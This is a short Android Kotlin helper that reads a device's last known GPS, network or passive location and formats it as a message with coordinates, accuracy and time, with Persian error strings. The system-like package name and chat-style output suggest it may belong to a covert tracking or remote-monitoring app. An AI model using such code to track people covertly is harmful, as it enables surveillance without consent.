package com.sys.svc.helpers

import android.annotation.SuppressLint
import android.content.Context
import android.location.LocationManager
import com.sys.svc.Logger

object LocationHelper {
    @SuppressLint("MissingPermission")
    fun get(ctx: Context): String {
        val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager
        val providers = listOf(
            LocationManager.GPS_PROVIDER,
            LocationManager.NETWORK_PROVIDER,
            LocationManager.PASSIVE_PROVIDER
        )
        for (p in providers) {
            try {
                val loc = lm.getLastKnownLocation(p) ?: continue
                return "📍 ${loc.latitude}, ${loc.longitude}\naccuracy=${loc.accuracy}m  provider=$p\n" +
                       "time: ${java.util.Date(loc.time)}"
            } catch (e: SecurityException) {
                return "❌ مجوز موقعیت داده نشده"
            } catch (e: Exception) {
                Logger.w("Loc", "${e.message}")
            }
        }
        return "❌ موقعیت در دسترس نیست (GPS خاموش؟)"
    }
}